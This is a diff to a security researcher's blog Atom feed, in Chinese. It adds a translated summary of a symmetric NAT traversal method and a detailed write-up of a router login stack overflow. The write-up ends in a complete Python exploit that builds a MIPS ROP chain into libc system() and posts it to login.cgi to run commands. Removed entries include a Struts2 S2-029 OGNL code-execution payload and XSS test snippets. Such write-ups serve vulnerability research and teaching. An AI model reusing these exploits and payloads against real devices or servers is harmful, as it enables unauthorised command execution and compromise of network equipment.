@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://xdxd.love/"/>
-  <updated>2016-10-17T00:25:41.000Z</updated>
+  <updated>2016-10-18T03:11:12.000Z</updated>
   <id>http://xdxd.love/</id>
   
   <author>
@@ -13,6 +13,55 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[对称NAT穿透的一种新方法]]></title>
+    <link href="http://xdxd.love/2016/10/18/%E5%AF%B9%E7%A7%B0NAT%E7%A9%BF%E9%80%8F%E7%9A%84%E4%B8%80%E7%A7%8D%E6%96%B0%E6%96%B9%E6%B3%95/"/>
+    <id>http://xdxd.love/2016/10/18/对称NAT穿透的一种新方法/</id>
+    <published>2016-10-18T01:57:26.000Z</published>
+    <updated>2016-10-18T03:11:12.000Z</updated>
+    <content type="html"><![CDATA[<h2 id="参考资料">参考资料</h2><p>整理翻译自<a href="https://www.goto.info.waseda.ac.jp/~wei/file/wei-apan-v10.pdf" target="_blank" rel="external">A New Method for Symmetric NAT Traversal in UDP and TCP</a><br><a href="http://www.cnblogs.com/my_life/articles/1908552.html" target="_blank" rel="external">NAT的四种类型及类型检测</a></p>
+<h2 id="关键字">关键字</h2><p>NAT穿透，对称NAT，UDP,P2P，状态包预测，TCP，P2P打洞</p>
+<h2 id="4中NAT类型">4中NAT类型</h2><p>用语定义</p>
+<p>1.内部Tuple：指内部主机的私有地址和端口号所构成的二元组，即内部主机所发送报文的源地址、端口所构成的二元组<br>2.外部Tuple：指内部Tuple经过NAT的源地址/端口转换之后，所获得的外部地址、端口所构成的二元组，即外部主机收到经NAT转换之后的报文时，它所看到的该报文的源地址（通常是NAT设备的地址）和源端口<br>3.目标Tuple：指外部主机的地址、端口所构成的二元组，即内部主机所发送报文的目标地址、端口所构成的二元组</p>
+<p>详细释义</p>
+<ol>
+<li>Full Cone NAT：所有来自同一 个内部Tuple X的请求均被NAT转换至同一个外部Tuple Y，而不管这些请求是不是属于同一个应用或者是多个应用的。除此之外，当X-Y的转换关系建立之后，任意外部主机均可随时将Y中的地址和端口作为目标地址 和目标端口，向内部主机发送UDP报文，由于对外部请求的来源无任何限制，因此这种方式虽然足够简单，但却不那么安全.</li>
+</ol>
+<p><img src="/images/nat1.png" alt=""></p>
+<ol>
+<li>Restricted Cone NAT： 它是Full Cone的受限版本：所有来自同一个内部Tuple X的请求均被NAT转换至同一个外部Tuple Y，这与Full Cone相同，但不同的是，只有当内部主机曾经发送过报文给外部主机（假设其IP地址为Z）后，外部主机才能以Y中的信息作为目标地址和目标端口，向内部 主机发送UDP请求报文，这意味着，NAT设备只向内转发（目标地址/端口转换）那些来自于当前已知的外部主机的UDP报文，从而保障了外部请求来源的安 全性</li>
+</ol>
+<p><img src="/images/nat2.png" alt=""></p>
+<ol>
+<li>Port Restricted Cone NAT：它是Restricted Cone NAT的进一步受限版。只有当内部主机曾经发送过报文给外部主机（假设其IP地址为Z且端口为P）之后，外部主机才能以Y中的信息作为目标地址和目标端 口，向内部主机发送UDP报文，同时，其请求报文的源端口必须为P，这一要求进一步强化了对外部报文请求来源的限制，从而较Restrictd Cone更具安全性</li>
+</ol>
+<p><img src="/images/nat3.png" alt=""></p>
+<ol>
+<li>Symmetric NAT：这是一种比所有Cone NAT都要更为灵活的转换方式：在Cone NAT中，内部主机的内部Tuple与外部Tuple的转换映射关系是独立于内部主机所发出的UDP报文中的目标地址及端口的，即与目标Tuple无关； 在Symmetric NAT中，目标Tuple则成为了NAT设备建立转换关系的一个重要考量：只有来自于同一个内部Tuple 、且针对同一目标Tuple的请求才被NAT转换至同一个外部Tuple，否则的话，NAT将为之分配一个新的外部Tuple；打个比方，当内部主机以相 同的内部Tuple对2个不同的目标Tuple发送UDP报文时，此时NAT将会为内部主机分配两个不同的外部Tuple，并且建立起两个不同的内、外部 Tuple转换关系。与此同时，只有接收到了内部主机所发送的数据包的外部主机才能向内部主机返回UDP报文，这里对外部返回报文来源的限制是与Port Restricted Cone一致的。不难看出，如果说Full Cone是要求最宽松NAT UDP转换方式，那么，Symmetric NAT则是要求最严格的NAT方式，其不仅体现在转换关系的建立上，而且还体现在对外部报文来源的限制方面。</li>
+</ol>
+<p><img src="/images/nat4.png" alt=""></p>
+<h2 id="已经存在的穿透方案">已经存在的穿透方案</h2><p>UPNP，STUN，Teredo等都无法支持对称NAT(第4类NAT)穿透。</p>
+<h2 id="新方法">新方法</h2><p>新方法的UDP打洞基于端口预测和限制TTL的值。也适用于其他的NAT类型。<br>新方法一共有3个阶段。</p>
+<p><img src="/images/nat5.png" alt=""></p>
+<h3 id="第一阶段">第一阶段</h3><p>假设两个通讯的终端分别为echo client和echo server。</p>
+<p>F1：echo client跟S1通讯，然后S1获得其经过NAT a的端口号。<br>F2：S1返回获得的端口号给echo client<br>F3：echo client给S2发一个包。包括上次S1返回的nat之后的端口号。S2记录下相关的NAT端口信息。<br><img src="/images/nat6.png" alt=""></p>
+<h3 id="第二阶段">第二阶段</h3><p>第二阶段是echo server跟S1和S2通信。流程跟echo client类似。</p>
+<p><img src="/images/nat7.png" alt=""></p>
+<h3 id="第三阶段">第三阶段</h3><p>经过之前的通讯，服务器可以获得echo client和echo server两次nat的端口号。比如echo client第一次nat端口为5361，第二次nat端口为5362，那么有理由猜测，第三次的端口为5363.经过测试发现端口的变化多是有一定的规律，递增，递减，跳跃等。</p>
+<p>F7: 基于前面两个阶段的通信，可以预测打洞的端口和打洞的模式。发送给echo server.<br>F8: 基于预测的端口，echo server发送大量的包。这些包包括一个固定的目的端口和低的TTL值。<br>F9: 同理，服务器将预测的端口发给echo client，跟F7类似。<br>F10: 基于预测的端口，echo client发送大量固定端口的数据包到预测的端口。之后，echo client 转换到接受模式。</p>
+<p>如果预测的端口刚好被大量的包都命中。那么就可以建立通信。</p>
+<p><img src="/images/nat8.png" alt=""></p>
+<h2 id="新方法的优势">新方法的优势</h2><h2 id="结论">结论</h2><p><img src="/images/nat9.png" alt=""></p>
+<p>这种方法从安全的角度来说是利用了目前路由器实现对称NAT的方法中存在端口可以预测的漏洞，利用这个漏洞来实现打洞。加上一次发送大量的包，来增加命中的概率。</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<h2 id="参考资料">参考资料</h2><p>整理翻译自<a href="https://www.goto.info.waseda.ac.jp/~wei/file/wei-apan-v10.pdf" target="_blank" rel="external">A New ]]>
+    </summary>
+    
+      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
+    
+  </entry>
   
   <entry>
     <title><![CDATA[unicode同形字引起的安全问题]]></title>
@@ -55,6 +104,153 @@
     </summary>
     
       <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[一个路由器登录处的溢出分析和利用]]></title>
+    <link href="http://xdxd.love/2016/10/11/%E4%B8%80%E4%B8%AA%E8%B7%AF%E7%94%B1%E5%99%A8%E7%99%BB%E5%BD%95%E5%A4%84%E7%9A%84%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8/"/>
+    <id>http://xdxd.love/2016/10/11/一个路由器登录处的溢出分析和利用/</id>
+    <published>2016-10-11T06:32:51.000Z</published>
+    <updated>2016-10-17T02:48:36.000Z</updated>
+    <content type="html"><![CDATA[<h2 id="漏洞poc">漏洞poc</h2><p>登录的时候，如果用户名或者密码字段超过一定长度，会导致http服务崩溃。</p>
+<p><img src="/images/luyouqimips1.png" alt=""></p>
+<p>可以看到服务端已经崩溃，对于这个请求，没有任何响应返回。</p>
+<h2 id="动态调试环境">动态调试环境</h2><p>将编译好gdb上传到路由器上。<a href="https://github.com/rapid7/embedded-tools" target="_blank" rel="external">gdb下载地址</a></p>
+<p>使用<a href="http://xdxd.love/2016/10/10/%E5%B8%B8%E7%94%A8linux%E5%91%BD%E4%BB%A4/">nc上传文件</a>。</p>
+<p>在本机上执行：</p>
+<pre><code>nc -l <span class="number">1111</span> &lt; ..<span class="regexp">/embedded-tools/</span>binaries<span class="regexp">/gdbserver/g</span>dbserver.mipsle
+</code></pre><p>路由器上执行：</p>
+<pre><code>nc <span class="number">192.168</span><span class="number">.7</span><span class="number">.51</span> <span class="number">1111</span> &gt; gdb
+</code></pre><p>接受文件保存为gdb。</p>
+<p><img src="/images/luyouqimips2.png" alt=""></p>
+<p>启动gdbserver附加进程进行远程调试。</p>
+<p><img src="/images/luyouqimips3.png" alt=""></p>
+<p>可以看到当密码超长时，程序执行流程被劫持。<br><img src="/images/luyouqimips4.png" alt=""></p>
+<h2 id="代码分析">代码分析</h2><p>搜索函数名login，可以定位到登录处理函数。<br><img src="/images/luyouqimips5.png" alt=""></p>
+<p>最后定位到溢出的代码为：sprintf函数格式化用户名和密码到缓冲区时造成溢出。</p>
+<p><img src="/images/luyouqimips6.png" alt=""></p>
+<h2 id="确定偏移">确定偏移</h2><h3 id="使用metasploit_pattern_generator">使用metasploit pattern generator</h3><p>使用metasploit pattern generator生成450个字符，作为密码发送给服务端。查看崩溃时$RA的地址。</p>
+<p><img src="/images/luyouqimips7.png" alt=""></p>
+<p><img src="/images/luyouqimips8.png" alt=""></p>
+<p>覆盖的寄存器有S0,S1,S2,RA,覆盖的值分别为：0x41396841，0x69413069，0x32694131，0x41336941。以RA为例计算其ascii为：A3iA。由于是小端系统。所以应该为Ai3A。</p>
+<p>使用metasploit pattern offset查找偏移为249。同理可以计算S0等寄存器的偏移。</p>
+<p><img src="/images/luyouqimips9.png" alt=""></p>
+<h3 id="根据代码对栈进行分析">根据代码对栈进行分析</h3><pre><code>.<span class="keyword">text</span>:<span class="number">00406</span>C6C timeout         = -<span class="number">0x1B0</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_1A8         = -<span class="number">0x1A8</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_1A0         = -<span class="number">0x1A0</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_19C         = -<span class="number">0x19C</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_198         = -<span class="number">0x198</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_118         = -<span class="number">0x118</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_116         = -<span class="number">0x116</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_10          = -<span class="number">0x10</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_C           = -<span class="number">0xC</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_8           = -<span class="number">8</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_4           = -<span class="number">4</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C6C
+.<span class="keyword">text</span>:<span class="number">00406</span>C6C                 li      <span class="variable">$gp</span>, <span class="number">0xD18F4</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C74                 addu    <span class="variable">$gp</span>, <span class="variable">$t9</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C78                 addiu   <span class="variable">$sp</span>, -<span class="number">0x1C0</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C7C                 sw      <span class="variable">$ra</span>, <span class="number">0x1C0</span>+var_4(<span class="variable">$sp</span>)
+.<span class="keyword">text</span>:<span class="number">00406</span>C80                 sw      <span class="variable">$s2</span>, <span class="number">0x1C0</span>+var_8(<span class="variable">$sp</span>)
+.<span class="keyword">text</span>:<span class="number">00406</span>C84                 sw      <span class="variable">$s1</span>, <span class="number">0x1C0</span>+var_C(<span class="variable">$sp</span>)
+.<span class="keyword">text</span>:<span class="number">00406</span>C88                 sw      <span class="variable">$s0</span>, <span class="number">0x1C0</span>+var_10(<span class="variable">$sp</span>)
+.<span class="keyword">text</span>:<span class="number">00406</span>C8C                 sw      <span class="variable">$gp</span>, <span class="number">0x1C0</span>+var_1A8(<span class="variable">$sp</span>)
+.<span class="keyword">text</span>:<span class="number">00406</span>C90                 la      <span class="variable">$t9</span>, memset
+.<span class="keyword">text</span>:<span class="number">00406</span>C94                 addiu   <span class="variable">$s0</span>, <span class="variable">$sp</span>, <span class="number">0x1C0</span>+var_118
+.<span class="keyword">text</span>:<span class="number">00406</span>C98                 <span class="keyword">move</span>    <span class="variable">$s1</span>, <span class="variable">$a0</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>C9C                 <span class="keyword">move</span>    <span class="variable">$s2</span>, <span class="variable">$a1</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>CA0                 <span class="keyword">move</span>    <span class="variable">$a0</span>, <span class="variable">$s0</span>         # s
+.<span class="keyword">text</span>:<span class="number">00406</span>CA4                 <span class="keyword">move</span>    <span class="variable">$a1</span>, <span class="variable">$zero</span>       # c
+.<span class="keyword">text</span>:<span class="number">00406</span>CA8                 jalr    <span class="variable">$t9</span> ; memset
+.<span class="keyword">text</span>:<span class="number">00406</span>CAC                 li      <span class="variable">$a2</span>, <span class="number">0x102</span>       # n
+.<span class="keyword">text</span>:<span class="number">00406</span>CB0                 lw      <span class="variable">$gp</span>, <span class="number">0x1C0</span>+var_1A8(<span class="variable">$sp</span>)
+.<span class="keyword">text</span>:<span class="number">00406</span>CB4                 beqz    <span class="variable">$s1</span>, loc_406E54
+.<span class="keyword">text</span>:<span class="number">00406</span>CB8                 nop
+.<span class="keyword">text</span>:<span class="number">00406</span>CBC                 beqz    <span class="variable">$s2</span>, loc_406E54
+.<span class="keyword">text</span>:<span class="number">00406</span>CC0                 li      <span class="variable">$v0</span>, <span class="number">0x32</span>  # <span class="string">'2'</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>CC4                 la      <span class="variable">$a1</span>, aDx_selectedind  # <span class="string">"dx.selectedIndex =%d;\n"</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>CC8                 la      <span class="variable">$t9</span>, sprintf
+.<span class="keyword">text</span>:<span class="number">00406</span>CCC                 <span class="keyword">move</span>    <span class="variable">$a2</span>, <span class="variable">$s1</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>CD0                 addiu   <span class="variable">$a1</span>, (aUsernameSPassw - <span class="number">0x480000</span>)  # <span class="string">"username:%s\r\npassword:%s\r\n"</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>CD4                 <span class="keyword">move</span>    <span class="variable">$a3</span>, <span class="variable">$s2</span>
+.<span class="keyword">text</span>:<span class="number">00406</span>CD8                 addiu   <span class="variable">$a0</span>, <span class="variable">$sp</span>, <span class="number">0x1C0</span>+var_116  # s
+.<span class="keyword">text</span>:<span class="number">00406</span>CDC                 jalr    <span class="variable">$t9</span> ; sprintf
+</code></pre><p>程序首先分配栈空间（addiu   $sp, -0x1C0），然后保存寄存器的值到栈上（sw      $ra, 0x1C0+var_4($sp)，sw      $s2, 0x1C0+var_8($sp)…），使用memset对栈空间的某个变量进行置零初始化。然后对a0，a1，就是传入的用户名密码做一个判断是否为0的判断，并没有检查长度。而sprintf函数的第一个参数a0的长度分配为($sp, 0x1C0+var_116)-16=262。</p>
+<p>其栈空间的分布如下图：<br><img src="/images/luyouqimips10.png" alt=""><br>由于字符串中拼接了用户名和其他的字符。password字段只需要249个字节之后就可以覆盖$RA。</p>
+<h2 id="利用ROP实现命令执行">利用ROP实现命令执行</h2><p>使用libc.so.0动态库中的gadget。搜索system函数地址为0004C7E0<br><img src="/images/luyouqimips11.png" alt=""></p>
+<p>使用mips rop finder插件搜索讲堆栈数据写入寄存器的指令。使用命令 mipsrop.stackfinders()</p>
+<p><img src="/images/luyouqimips12.png" alt=""></p>
+<pre><code>.text:<span class="number">000257</span>A<span class="number">0</span>                 addiu   <span class="variable">$a0</span>, <span class="variable">$sp</span>, <span class="number">0x58</span>+var_4<span class="number">0</span>
+.text:<span class="number">000257</span>A4                 move    <span class="variable">$t9</span>, <span class="variable">$s0</span>
+.text:<span class="number">000257</span>A8                 jalr    <span class="variable">$t9</span>
+</code></pre><p>0x000257A0处的的指令非常完美。将栈数据写入a0,然后跳转S0,而S0也是我们可以控制的。</p>
+<p>所以整个rop的流程为：</p>
+<p><img src="/images/luyouqimips13.png" alt=""></p>
+<p>由于libc.so.0是动态加载的，所以开始获取到的system地址是一个相对基址的偏移地址。需要获取libc.so.0动态库的基址为2ac81000。获取命令为：</p>
+<p><img src="/images/luyouqimips14.png" alt=""></p>
+<p>最终的exp如下：</p>
+<pre><code><span class="comment">#!/usr/bin/env python</span>
+<span class="comment"># encoding: utf-8</span>
+
+<span class="string">"""
+@version: 0.01
+@author: xdxd
+@license: Apache Licence 
+@contact: 646901834@qq.com
+@site: http://www.xdxd.love
+@software: PyCharm
+@file: mipsexp.py.py
+@time: 16/10/13 上午10:48
+"""</span>
+<span class="keyword">import</span> sys
+<span class="keyword">import</span> time
+<span class="keyword">import</span> string
+<span class="keyword">import</span> socket
+<span class="keyword">from</span> random <span class="keyword">import</span> Random
+<span class="keyword">import</span> urllib, urllib2, httplib
+<span class="keyword">import</span> json,struct
+<span class="keyword">import</span> requests
+
+<span class="function"><span class="keyword">def</span> <span class="title">makenop</span><span class="params">(length)</span>:</span>
+    <span class="keyword">return</span> <span class="string">'B'</span> * length
+
+<span class="function"><span class="keyword">def</span> <span class="title">makepayload</span><span class="params">(rop, cmd)</span>:</span>
+    payload = makenop(<span class="number">237</span>)
+    payload += struct.pack(<span class="string">"&lt;L"</span>, rop[<span class="number">1</span>])
+    payload += makenop(<span class="number">8</span>)
+    payload += struct.pack(<span class="string">"&lt;L"</span>, rop[<span class="number">0</span>])  <span class="comment"># eip</span>
+    payload += makenop(<span class="number">0x18</span>)
+    payload += cmd
+    payload += <span class="string">"||"</span>
+    open(<span class="string">'shellcode'</span>, <span class="string">'wb'</span>).write(payload)
+    <span class="keyword">return</span> payload
+<span class="function"><span class="keyword">def</span> <span class="title">requestsbody</span><span class="params">(url,palyload)</span>:</span>
+    proxies = {
+        <span class="string">'http'</span>: <span class="string">'http://127.0.0.1:8080'</span>,
+        <span class="string">'https'</span>: <span class="string">'http://127.0.0.1:8080'</span>,
+    }
+    requests.post(url,data=payload,proxies=proxies)
+
+<span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:
+    cmd = <span class="string">"echo testxdxd &gt; /tmp/expxdxd"</span>
+    <span class="comment"># cmd ="ls"</span>
+    url = <span class="string">"http://192.168.7.1/login.cgi"</span>
+
+    libso = <span class="number">0x2ac81000</span>
+    rop = [libso + <span class="number">0x257A0</span>, libso + <span class="number">0x4c7E0</span>]
+    <span class="keyword">print</span> hex(rop[<span class="number">0</span>]), hex(rop[<span class="number">1</span>])
+    payload = {<span class="string">'username'</span>: <span class="string">'admin'</span>, <span class="string">'userpwd'</span>:makepayload(rop,cmd)}
+    requestsbody(url,payload)
+</code></pre><p><img src="/images/luyouqimips15.png" alt=""></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<h2 id="漏洞poc">漏洞poc</h2><p>登录的时候，如果用户名或者密码字段超过一定长度，会导致http服务崩溃。</p>
+<p><img src="/images/luyouqimips1.png" alt=""></p>
+<p>可以看到服务端已经崩溃，对于这个请]]>
+    </summary>
+    
+      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
     
   </entry>
   
@@ -981,88 +1177,6 @@ W/System.err(<span class="number">24780</span>):    <span class="keyword">at</sp
       <category term="bugfree" scheme="http://xdxd.love/tags/bugfree/"/>
     
       <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[struts2 s2-029 漏洞]]></title>
-    <link href="http://xdxd.love/2016/03/21/struts2-s2-029-%E6%BC%8F%E6%B4%9E/"/>
-    <id>http://xdxd.love/2016/03/21/struts2-s2-029-漏洞/</id>
-    <published>2016-03-21T02:14:55.000Z</published>
-    <updated>2016-03-22T08:23:23.000Z</updated>
-    <content type="html"><![CDATA[<p>S2-029的公告说是可能的远程代码执行。而且依然是ognl导致的。</p>
-<pre><code>The Apache Struts frameworks performs double evaluation of attributes <span class="built_in">values</span> assigned <span class="keyword">to</span> certain <span class="keyword">tags</span> <span class="keyword">so</span> it <span class="keyword">is</span> possible <span class="keyword">to</span> pass in <span class="keyword">a</span> value that will <span class="keyword">be</span> evaluated again when <span class="keyword">a</span> <span class="keyword">tag</span>’<span class="keyword">s</span> attributes will <span class="keyword">be</span> rendered.
-</code></pre><p>目前网上已经有一些成熟的参考的资料了。详见文末参考资料。这次的漏洞虽然是代码执行。但是风险不高，需要开发者使用了特定的代码写法才会导致漏洞。需要直接将用户提交的数据通过标签设置成属性值。</p>
-<p>比如：</p>
-<pre><code><span class="tag">&lt;<span class="title">s:i18n</span> <span class="attribute">name</span>=<span class="value">"%&amp;#123#request.lan&amp;#125"</span>&gt;</span>xxxxx<span class="tag">&lt;/<span class="title">s:i18n</span>&gt;</span>
-<span class="tag">&lt;<span class="title">set</span> <span class="attribute">var</span>=<span class="value">"%&amp;#123#parameters.tang3&amp;#125"</span>/&gt;</span>
-</code></pre><p>通过<code>%&amp;#123#&amp;#125</code>的方式获取用户输入放入标签属性，会导致代码执行。struts2的修复方式也是直接过滤了<code>%&amp;#123&amp;#125</code>形式的字符串的ognl解析。</p>
-<p><img src="/images/struts0291.png" alt=""></p>
-<pre><code>这段代码的修改用来处理掉了非%&amp;<span class="preprocessor">#<span class="number">123</span>开头，&amp;#<span class="number">125</span>结尾的字符串进行ognl解析的功能，这里我们来举个例子：bar%&amp;#<span class="number">1232</span>+<span class="number">3</span>&amp;#<span class="number">125</span>，在修改之前的代码中<span class="number">2</span>+<span class="number">3</span>是会被作为ognl执行的。那么修改后，这种形式就只会被当做字符串来返回。</span>
-</code></pre><p>审计方式就是查看是否有<code>%&amp;#123#&amp;#125</code>这种方式获取用户输入变量复制给标签属性的代码写法。</p>
-<p>测试代码：</p>
-<pre><code><span class="xml"></span>&lt;%<span class="perl"><span class="variable">@page</span> import=<span class="string">"java.util.HashSet"</span></span>%&gt;<span class="xml">
-</span>&lt;%<span class="perl">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span>%&gt;<span class="xml">
-</span>&lt;%<span class="perl">@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> </span>%&gt;<span class="xml">
-<span class="tag">&lt;<span class="title">html</span>&gt;</span>
-<span class="tag">&lt;<span class="title">head</span>&gt;</span><span class="tag">&lt;<span class="title">title</span>&gt;</span>Demo jsp page<span class="tag">&lt;/<span class="title">title</span>&gt;</span><span class="tag">&lt;/<span class="title">head</span>&gt;</span>
-<span class="tag">&lt;<span class="title">body</span>&gt;</span>
-</span>&lt;%<span class="perl">
-  request.setAttribute(<span class="string">"lan"</span>, <span class="string">"'),#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#a=<span class="variable">@java</span>.lang.Runtime<span class="variable">@getRuntime</span>(),#a.exec('touch /tmp/1111'),new java.lang.String('"</span>);
-</span>%&gt;<span class="xml">
-<span class="tag">&lt;<span class="title">s:i18n</span> <span class="attribute">name</span>=<span class="value">"%&amp;#123#request.lan&amp;#125"</span>&gt;</span>xxxxx<span class="tag">&lt;/<span class="title">s:i18n</span>&gt;</span>
-<span class="tag">&lt;/<span class="title">body</span>&gt;</span>
-<span class="tag">&lt;/<span class="title">html</span>&gt;</span></span>
-</code></pre><p><img src="/images/struts0292.png" alt=""></p>
-<p>查看tmp目录文件已经生成。</p>
-<p><img src="/images/struts0293.png" alt=""></p>
-<h1 id="参考资料">参考资料</h1><p><a href="http://blog.nsfocus.net/struts-framework-s2-29-remote-code-execution-vulnerability/" target="_blank" rel="external">http://blog.nsfocus.net/struts-framework-s2-29-remote-code-execution-vulnerability/</a></p>
-<p><a href="http://seclab.dbappsecurity.com.cn/?p=678" target="_blank" rel="external">http://seclab.dbappsecurity.com.cn/?p=678</a></p>
-<p><a href="http://www.freebuf.com/vuls/99234.html" target="_blank" rel="external">http://www.freebuf.com/vuls/99234.html</a></p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p>S2-029的公告说是可能的远程代码执行。而且依然是ognl导致的。</p>
-<pre><code>The Apache Struts frameworks performs double evaluation of attributes <span class="buil]]>
-    </summary>
-    
-      <category term="java" scheme="http://xdxd.love/tags/java/"/>
-    
-      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[google firing-range xss测试应用]]></title>
-    <link href="http://xdxd.love/2016/03/17/google-firing-range-xss%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8/"/>
-    <id>http://xdxd.love/2016/03/17/google-firing-range-xss测试应用/</id>
-    <published>2016-03-17T06:03:47.000Z</published>
-    <updated>2016-03-18T00:17:48.000Z</updated>
-    <content type="html"><![CDATA[<p><a href="https://github.com/google/firing-range" target="_blank" rel="external">firing-range</a>是谷歌发布的一个XSS测试环境，用来检测扫描器的能力。在线访问地址：<a href="https://public-firing-range.appspot.com" target="_blank" rel="external">https://public-firing-range.appspot.com</a></p>
-<p>谷歌对每个位置都进行了详细的分类。</p>
-<p><img src="/source/images/firing-range1.png" alt=""></p>
-<p><img src="/source/images/firing-range2.png" alt=""></p>
-<p>对其中两例进行分析：location.hash.assign</p>
-<pre><code>    <span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">
-  <span class="keyword">var</span> payload = <span class="built_in">window</span>.location.hash.substr(<span class="number">1</span>);<span class="built_in">window</span>.location.assign(payload);
-</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
-</code></pre><p>获取hash值，进入了assign函数。</p>
-<p><img src="/source/images/firing-range3.png" alt=""></p>
-<p>参考<a href="http://www.wooyun.org/bugs/wooyun-2013-041721" target="_blank" rel="external">搜狗浏览器4.2.2.9903任意网站伪造＋自有协议下XSS*2</a></p>
-<p>location.hash.innerHtml</p>
-<pre><code>    <span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">
-      <span class="keyword">var</span> payload = <span class="built_in">window</span>.location.hash.substr(<span class="number">1</span>);<span class="keyword">var</span> div = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);
-div.id = <span class="string">'divEl'</span>;
-<span class="built_in">document</span>.documentElement.appendChild(div);
-<span class="keyword">var</span> divEl = <span class="built_in">document</span>.getElementById(<span class="string">'divEl'</span>);
-divEl.innerHTML = payload;
-    </span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
-</code></pre><h1 id="location-search_和location-hash">location.search 和location.hash</h1><p>测试发现location.search获取到的值是浏览器地址栏url编码后的。而location.hash获取到的值是原始的值，既hash是%23获取到就是%23,hash是<code>&lt;</code>获取到就是<code>&lt;</code>说以直接innerHtml可以触发xss。</p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p><a href="https://github.com/google/firing-range" target="_blank" rel="external">firing-range</a>是谷歌发布的一个XSS测试环境，用来检测扫描器的能力。在线访问地址：<a href]]>
-    </summary>
-    
-      <category term="前端安全" scheme="http://xdxd.love/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
     
   </entry>
   
